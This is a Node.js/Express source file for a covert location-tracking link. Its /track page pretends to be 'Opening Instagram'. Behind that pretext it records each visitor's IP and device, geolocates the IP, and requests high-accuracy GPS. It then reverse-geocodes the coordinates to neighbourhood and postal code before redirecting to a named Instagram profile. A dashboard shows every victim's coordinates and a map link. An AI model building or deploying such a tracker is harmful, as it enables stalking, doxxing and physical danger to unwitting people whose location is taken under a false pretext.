const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const clicks = [];
const gpsData = [];

// ROTA 1: Dashboard
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <title>📊 Dashboard GPS</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: Arial, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 2rem;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          padding: 2rem;
          border-radius: 15px;
          margin-bottom: 2rem;
          text-align: center;
        }
        .tracking-link {
          background: #667eea;
          color: white;
          padding: 1rem 2rem;
          border-radius: 10px;
          text-decoration: none;
          display: inline-block;
          margin-top: 1rem;
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 1rem;
          margin-bottom: 2rem;
        }
        .stat-card {
          background: white;
          padding: 1.5rem;
          border-radius: 10px;
          text-align: center;
        }
        .stat-card h3 { color: #667eea; font-size: 2rem; }
        .clicks-container { display: grid; gap: 1rem; }
        .click-card {
          background: white;
          padding: 1.5rem;
          border-radius: 10px;
        }
        .click-card.with-gps { border-left: 5px solid #10b981; }
        .click-card.with-ip { border-left: 5px solid #f59e0b; }
        .maps-link {
          background: #10b981;
          color: white;
          padding: 0.8rem 1.5rem;
          border-radius: 8px;
          text-decoration: none;
          display: inline-block;
          margin-top: 1rem;
        }
        .reload-btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 1rem 2rem;
          border-radius: 10px;
          cursor: pointer;
          margin-bottom: 1rem;
        }
        .precision-badge {
          display: inline-block;
          padding: 0.3rem 0.8rem;
          border-radius: 5px;
          font-size: 0.85rem;
          font-weight: bold;
          margin-top: 0.5rem;
        }
        .precision-high { background: #10b981; color: white; }
        .precision-medium { background: #f59e0b; color: white; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📊 Dashboard de Rastreamento GPS</h1>
          <a href="/track" class="tracking-link">🔗 Link de Rastreamento</a>
        </div>
        <button class="reload-btn" onclick="loadData()">🔄 Atualizar</button>
        <div id="stats" class="stats"></div>
        <div id="clicks" class="clicks-container"></div>
      </div>
      <script>
        async function loadData() {
          const res = await fetch('/api/stats');
          const data = await res.json();
          
          document.getElementById('stats').innerHTML = \`
            <div class="stat-card"><h3>\${data.totalClicks}</h3><p>Total</p></div>
            <div class="stat-card"><h3>\${data.clicksComGPS || 0}</h3><p>GPS Exato</p></div>
            <div class="stat-card"><h3>\${data.clicksComIP || 0}</h3><p>Localização IP</p></div>
          \`;

          const clicksHtml = data.clicks.map(c => {
            const hasGPS = c.gps && c.gps.lat;
            const hasIPLocation = c.ipLocation && c.ipLocation.cidade;
            const loc = c.location || c.ipLocation;
            
            return \`
              <div class="click-card \${hasGPS ? 'with-gps' : 'with-ip'}">
                <div><strong>⏰</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</div>
                <div><strong>🌐 IP:</strong> \${c.ip}</div>
                <div><strong>📱</strong> \${c.device}</div>
                
                \${hasGPS ? \`
                  <div style="margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #10b981;">
                    <div style="color: #10b981; font-weight: bold;">📍 LOCALIZAÇÃO GPS EXATA</div>
                    <span class="precision-badge precision-high">✓ Precisão Alta</span>
                    \${loc ? \`
                      <div style="margin-top: 0.8rem;"><strong>🏙️ Cidade:</strong> \${loc.cidade}, \${loc.estado}</div>
                      <div><strong>🏘️ Bairro:</strong> \${loc.bairro}</div>
                      <div><strong>📮 CEP:</strong> \${loc.cep}</div>
                    \` : ''}
                    <div><strong>🗺️ Coordenadas:</strong> \${c.gps.lat}, \${c.gps.lng}</div>
                    <div><strong>🎯 Precisão:</strong> ±\${Math.round(c.gps.accuracy)}m</div>
                    <a href="https://www.google.com/maps?q=\${c.gps.lat},\${c.gps.lng}" 
                       target="_blank" class="maps-link">📍 Ver no Google Maps</a>
                  </div>
                \` : hasIPLocation ? \`
                  <div style="margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #f59e0b;">
                    <div style="color: #f59e0b; font-weight: bold;">📍 LOCALIZAÇÃO POR IP</div>
                    <span class="precision-badge precision-medium">⚠ Precisão Aproximada</span>
                    <div style="margin-top: 0.8rem;"><strong>🏙️ Cidade:</strong> \${hasIPLocation.cidade}</div>
                    <div><strong>🗺️ Estado:</strong> \${hasIPLocation.estado}</div>
                    <div><strong>🌎 País:</strong> \${hasIPLocation.pais}</div>
                    <div style="color: #6b7280; font-size: 0.9rem; margin-top: 0.5rem;">
                      ℹ️ GPS não autorizado - localização aproximada baseada no IP
                    </div>
                  </div>
                \` : \`
                  <div style="color: #ef4444; margin-top: 1rem;">⚠️ Localização não disponível</div>
                \`}
              </div>
            \`;
          }).join('');
          
          document.getElementById('clicks').innerHTML = clicksHtml || '<p>Nenhum clique</p>';
        }
        
        loadData();
        setInterval(loadData, 10000);
      </script>
    </body>
    </html>
  `);
});

// ROTA 2: Rastreamento
app.get('/track', async (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
    referer: req.headers.referer || 'Direct',
    device: req.headers['user-agent'].includes('Mobile') ? 'Mobile' : 'Desktop'
  };
  
  clicks.push(clickData);
  console.log('📍 Novo clique ID:', clickData.id);
  
  // Captura localização por IP imediatamente
  try {
    const ipClean = clickData.ip.replace('::ffff:', '');
    console.log('🔍 Buscando localização do IP:', ipClean);
    
    const response = await fetch(`http://ip-api.com/json/${ipClean}?lang=pt&fields=status,country,regionName,city,lat,lon`);
    const ipData = await response.json();
    
    if (ipData.status === 'success') {
      clickData.ipLocation = {
        cidade: ipData.city || 'N/A',
        estado: ipData.regionName || 'N/A',
        pais: ipData.country || 'N/A',
        lat: ipData.lat,
        lng: ipData.lon
      };
      console.log(`🏙️ Localização IP: ${ipData.city}, ${ipData.regionName}`);
    }
  } catch (error) {
    console.error('❌ Erro ao buscar localização IP:', error.message);
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Redirecionando...</title>
      <style>
        body {
          margin: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
          color: white;
          font-family: Arial;
          text-align: center;
        }
        .spinner {
          width: 50px;
          height: 50px;
          border: 5px solid rgba(255,255,255,0.3);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
      </style>
    </head>
    <body>
      <div>
        <div class="spinner"></div>
        <h1>📷 Abrindo Instagram</h1>
        <p id="status">Aguarde...</p>
      </div>
      <script>
        const clickId = ${clickData.id};
        
        console.log('🔍 Click ID:', clickId);
        console.log('🔍 Iniciando captura de GPS...');
        
        if (navigator.geolocation) {
          console.log('✅ Geolocalização disponível');
          document.getElementById('status').textContent = 'Obtendo localização...';
          
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              console.log('✅ GPS capturado!');
              console.log('📍 Lat:', pos.coords.latitude, 'Lng:', pos.coords.longitude);
              
              const gpsData = {
                clickId: clickId,
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                timestamp: new Date().toISOString()
              };
              
              console.log('📤 Enviando GPS...');
              
              try {
                const response = await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify(gpsData)
                });
                
                const result = await response.json();
                console.log('✅ Servidor respondeu:', result);
              } catch (error) {
                console.error('❌ Erro ao enviar:', error);
              }
              
              document.getElementById('status').textContent = 'Redirecionando...';
              setTimeout(() => {
                window.location.href = 'https://www.instagram.com/andre.osantos12/';
              }, 1000);
            },
            (error) => {
              console.error('❌ Erro GPS:', error.code, error.message);
              console.log('ℹ️ Usando localização por IP como fallback');
              setTimeout(() => {
                window.location.href = 'https://www.instagram.com/andre.osantos12/';
              }, 1500);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        } else {
          console.error('❌ GPS não disponível');
          console.log('ℹ️ Usando localização por IP como fallback');
          setTimeout(() => {
            window.location.href = 'https://www.instagram.com/andre.osantos12/';
          }, 1500);
        }
      </script>
    </body>
    </html>
  `);
});

// ROTA 3: Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  console.log('\n📥 Requisição GPS recebida');
  console.log('Body:', req.body);
  
  try {
    const gps = req.body;
    
    if (!gps || !gps.latitude || !gps.longitude) {
      console.error('❌ Dados inválidos');
      return res.status(400).json({success: false, error: 'Dados inválidos'});
    }
    
    gpsData.push(gps);
    console.log('✅ GPS adicionado ao array');
    
    const click = clicks.find(c => c.id === gps.clickId);
    console.log('🔍 Click ID:', gps.clickId, '- Encontrado:', !!click);
    
    if (click) {
      click.gps = {
        lat: gps.latitude,
        lng: gps.longitude,
        accuracy: gps.accuracy
      };
      
      console.log('✅ GPS associado ao click');
      console.log(`📍 ${gps.latitude}, ${gps.longitude}`);
      console.log(`🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
      
      // Busca endereço COMPLETO com GPS (bairro e CEP)
      try {
        const response = await fetch(
          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.latitude}&longitude=${gps.longitude}&localityLanguage=pt`
        );
        
        const data = await response.json();
        
        if (data) {
          click.location = {
            cidade: data.city || data.locality || 'N/A',
            estado: data.principalSubdivision || 'N/A',
            pais: data.countryName || 'Brasil',
            bairro: data.localityInfo?.administrative?.[0]?.name || data.locality || 'N/A',
            cep: data.postcode || 'N/A'
          };
          
          console.log(`🏙️ ${click.location.cidade}, ${click.location.estado}`);
          console.log(`🏘️ Bairro: ${click.location.bairro}`);
          console.log(`📮 CEP: ${click.location.cep}`);
        }
      } catch (error) {
        console.error('❌ Erro ao buscar endereço:', error.message);
      }
    }
    
    res.json({success: true});
  } catch (error) {
    console.error('❌ Erro:', error);
    res.status(500).json({success: false});
  }
});

// ROTA 4: Stats
app.get('/api/stats', (req, res) => {
  res.json({
    totalClicks: clicks.length,
    clicksComGPS: clicks.filter(c => c.gps).length,
    clicksComIP: clicks.filter(c => !c.gps && c.ipLocation).length,
    clicks: clicks
  });
});

// Inicia servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor na porta ${PORT}`);
});
